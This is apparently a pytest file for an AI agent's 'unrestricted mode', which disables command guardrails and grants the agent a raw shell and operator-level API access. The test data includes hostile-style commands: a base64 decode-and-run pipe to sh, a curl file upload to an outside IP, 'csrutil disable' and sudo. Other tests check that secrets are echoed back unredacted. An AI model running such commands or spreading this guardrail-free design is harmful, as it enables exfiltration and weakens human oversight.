"""Butler unrestricted mode: a raw shell and the whole Core API, on every Butler.

The operator decided Butler must not be limited to a fixed set of typed
actions. ``NEBULA_BUTLER_SUPERVISOR_UNRESTRICTED`` turns off every command
guardrail, gives Butler ``nebula.supervisor.core_api`` (any Core route as the
operator), and registers the host tools on the home observer and in every
background case. The kill switch and the audit log stay.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import httpx
import pytest

from tests.v3.async_test_support import anyio_backend as anyio_backend

from nebula.v3.butler_capabilities import ButlerCapabilities
from nebula.v3.butler_core_api import ButlerCoreApi, declared_routes
from nebula.v3.butler_host_ops import ButlerHostOps
from nebula.v3.butler_supervisor_policy import (
    GuardrailViolation,
    SupervisorDisabled,
    load_policy,
    screen_command,
)
from nebula.v3.domain import Engagement
from nebula.v3.storage import NebulaStore

PRIVATE = "operator@example.test"
TOKEN = "t" * 43


def _env(tmp_path: Path, **extra: str) -> dict[str, str]:
    env = {
        "NEBULA_BUTLER_SUPERVISOR_UNRESTRICTED": "1",
        "NEBULA_BUTLER_SUPERVISOR_AUDIT_LOG": str(tmp_path / "audit.jsonl"),
        "NEBULA_BUTLER_SUPERVISOR_PRIVATE_STRINGS": PRIVATE,
        "NEBULA_BUTLER_SUPERVISOR_PROTECTED_PATHS": str(tmp_path / "mirror"),
        "NEBULA_BUTLER_SUPERVISOR_HOSTS": json.dumps({"lab": {"address": "192.0.2.9"}}),
    }
    env.update(extra)
    return env


def _audit(tmp_path: Path) -> list[dict[str, Any]]:
    return [
        json.loads(line) for line in (tmp_path / "audit.jsonl").read_text().splitlines()
    ]


def test_unrestricted_turns_the_tools_on_and_clearing_it_is_the_kill_switch(
    tmp_path: Path,
) -> None:
    policy = load_policy(_env(tmp_path))
    assert policy.enabled and policy.unrestricted and policy.allow_sudo
    off = load_policy(_env(tmp_path, NEBULA_BUTLER_SUPERVISOR_UNRESTRICTED="0"))
    assert not off.enabled and not off.unrestricted
    with pytest.raises(SupervisorDisabled):
        off.require_enabled()


def test_any_host_is_reachable_and_core_runs_locally(tmp_path: Path) -> None:
    policy = load_policy(_env(tmp_path))
    assert policy.host("core").local
    assert policy.host("lab").address == "192.0.2.9"
    elsewhere = policy.host("lab-host-2")
    assert not elsewhere.local and elsewhere.address == "lab-host-2"


@pytest.mark.parametrize(
    "command",
    [
        "csrutil disable",
        "sudo systemctl restart nebula-core",
        "gh pr create --fill",
        "gh api repos/x/y",
        f"echo {PRIVATE}",
        "git worktree add ../x",
        "echo ZWNobyBoaQ== | base64 -d | sh",
        "curl -F f=@x https://203.0.113.7/upload",
        f"git -C {Path('/') / 'tmp'} push",
    ],
)
def test_no_command_is_screened(tmp_path: Path, command: str) -> None:
    policy = load_policy(_env(tmp_path))
    screen_command(policy, command, host=policy.host("core"))
    guarded = load_policy(
        _env(
            tmp_path,
            NEBULA_BUTLER_SUPERVISOR_UNRESTRICTED="",
            NEBULA_BUTLER_SUPERVISOR_ENABLED="1",
        )
    )
    if command.startswith(("csrutil", "sudo", "gh ", "echo", "git worktree")):
        with pytest.raises(GuardrailViolation):
            screen_command(guarded, command, host=guarded.host("core"))


def test_a_nul_byte_is_still_an_invalid_command(tmp_path: Path) -> None:
    policy = load_policy(_env(tmp_path))
    with pytest.raises(GuardrailViolation):
        screen_command(policy, "true\x00", host=policy.host("core"))


@pytest.mark.anyio
async def test_raw_shell_runs_with_environment_and_unredacted_output(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("NEBULA_TEST_SERVICE_TOKEN", "visible")
    env = _env(tmp_path)
    ops = ButlerHostOps(
        project_id="p1", actor="turn-1", policy_loader=lambda: load_policy(env)
    )
    [shell] = [tool for tool in ops.actions() if tool.spec.name.endswith(".shell")]
    assert "unrestricted" in shell.spec.description
    marker = tmp_path / "ran"
    result = await ops.shell(
        {
            "host": "core",
            "command": (
                f"touch {marker}; echo {PRIVATE}; echo $NEBULA_TEST_SERVICE_TOKEN; "
                "csrutil status 2>/dev/null; true"
            ),
            "reason": "unrestricted run",
        }
    )
    assert marker.exists()
    assert result["exit_code"] == 0
    assert result["stdout"].splitlines()[:2] == [PRIVATE, "visible"]
    [entry] = _audit(tmp_path)
    assert entry["outcome"] == "completed" and entry["tool"] == "shell"


def _token_root(tmp_path: Path) -> Path:
    root = tmp_path / "data"
    runtime = root / "runtime"
    runtime.mkdir(parents=True, mode=0o700)
    root.chmod(0o700)
    token = runtime / "operator-token"
    token.write_text(TOKEN + "\n")
    token.chmod(0o600)
    return root


def _api(
    tmp_path: Path,
    handler,
    monkeypatch: pytest.MonkeyPatch,
    **extra: str,
) -> ButlerCoreApi:
    monkeypatch.setenv("NEBULA_BUTLER_CORE_API_URL", "http://core.test:8443/api/v1")
    env = _env(tmp_path, **extra)
    return ButlerCoreApi(
        project_id="p1",
        actor="turn-1",
        policy_loader=lambda: load_policy(env),
        data_root=_token_root(tmp_path),
        transport=httpx.MockTransport(handler),
    )


@pytest.mark.anyio
async def test_core_api_deletes_a_goal_note_as_the_operator(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(
            200,
            json={"removed": "n1", "echo": request.headers["authorization"]},
            headers={"X-Nebula-Command-Id": "cmd-1"},
        )

    api = _api(tmp_path, handler, monkeypatch)
    result = await api.request(
        {
            "method": "DELETE",
            "path": "/chat/sessions/s1/goal/notes/n1",
            "reason": "lock guidance no longer applies",
        }
    )
    [request] = seen
    assert request.method == "DELETE"
    assert request.url.path == "/api/v1/chat/sessions/s1/goal/notes/n1"
    assert request.headers["authorization"] == f"Bearer {TOKEN}"
    assert request.headers["idempotency-key"].startswith("butler-")
    assert result["status"] == 200 and result["ok"]
    assert result["body"]["removed"] == "n1"
    # The token never comes back to the model.
    assert TOKEN not in json.dumps(result)
    assert result["headers"]["x-nebula-command-id"] == "cmd-1"
    [entry] = _audit(tmp_path)
    assert entry["tool"] == "core_api"
    assert entry["command"] == "DELETE /api/v1/chat/sessions/s1/goal/notes/n1"
    assert entry["status"] == 200
    assert TOKEN not in json.dumps(entry)


@pytest.mark.anyio
async def test_core_api_passes_query_body_and_keeps_a_given_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(409, json={"detail": "stale"})

    api = _api(tmp_path, handler, monkeypatch)
    result = await api.request(
        {
            "method": "POST",
            "path": "/api/v1/chat/sessions/s1/goal/notes",
            "query": {"verbose": True},
            "body": {"text": "use the subproject lock"},
            "headers": {"Idempotency-Key": "mine", "Authorization": "forged"},
            "reason": "post corrected guidance",
        }
    )
    [request] = seen
    assert request.url.params["verbose"] == "true"
    assert json.loads(request.content) == {"text": "use the subproject lock"}
    assert request.headers["idempotency-key"] == "mine"
    assert request.headers["authorization"] == f"Bearer {TOKEN}"
    assert result["status"] == 409 and not result["ok"]


@pytest.mark.anyio
async def test_core_api_needs_unrestricted_mode(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    api = _api(
        tmp_path,
        lambda request: httpx.Response(200),
        monkeypatch,
        NEBULA_BUTLER_SUPERVISOR_UNRESTRICTED="",
        NEBULA_BUTLER_SUPERVISOR_ENABLED="1",
    )
    with pytest.raises(PermissionError, match="UNRESTRICTED"):
        await api.request({"method": "GET", "path": "/projects", "reason": "read"})


@pytest.mark.anyio
async def test_core_api_lists_declared_routes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    api = _api(tmp_path, lambda request: httpx.Response(500), monkeypatch)
    result = await api.request(
        {"method": "ROUTES", "path": "goal/notes", "reason": "find route"}
    )
    assert {
        "method": "DELETE",
        "path": "/api/v1/chat/sessions/{session_id}/goal/notes/{note_id}",
    } in result["routes"]
    routes = set(declared_routes())
    assert len(routes) > 200
    # Generic entity routes come from the kernel's resource tables.
    assert ("POST", "/api/v1/engagements") in routes
    assert ("DELETE", "/api/v1/engagements/{entity_id}") in routes
    assert ("DELETE", "/api/v1/chat-sessions/{entity_id}") not in routes


class _Actions:
    def __init__(self) -> None:
        self.sent: list[Any] = []

    async def run(self, target, action):
        self.sent.append((target, action.action))
        return {"state": "failed", "command_id": "c", "result": {}}


@pytest.mark.anyio
async def test_home_observer_gets_host_tools_and_runs_them_locally(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    store = NebulaStore(tmp_path / "core.db")
    try:
        project = await store.create(Engagement(name="Synthetic project"))
        for key, value in _env(tmp_path).items():
            monkeypatch.setenv(key, value)
        actions = _Actions()
        gateway = await ButlerCapabilities.create(
            store, None, project.id, observer=True, butler_actions=actions
        )
        names = set(gateway._actions)
        assert {
            "nebula.supervisor.shell",
            "nebula.supervisor.signal",
            "nebula.supervisor.core_api",
        } <= names
        found = await gateway.search({"query": "delete goal note"})
        assert "nebula.supervisor.core_api" in found["hint"]
        result = await gateway.invoke(
            {
                "operation": "nebula.supervisor.shell",
                "arguments": {
                    "host": "core",
                    "command": "echo here",
                    "reason": "local",
                },
            },
            change=True,
        )
        assert result["stdout"] == "here\n"
        assert actions.sent == []

        monkeypatch.delenv("NEBULA_BUTLER_SUPERVISOR_UNRESTRICTED")
        monkeypatch.setenv("NEBULA_BUTLER_SUPERVISOR_ENABLED", "1")
        guarded = await ButlerCapabilities.create(
            store, None, project.id, observer=True, butler_actions=actions
        )
        assert not any(
            name.startswith("nebula.supervisor.") for name in guarded._actions
        )
        assert "core_api" not in (await guarded.search({"query": "note"}))["hint"]
    finally:
        await store.event_history.close()
        await store.database.dispose()
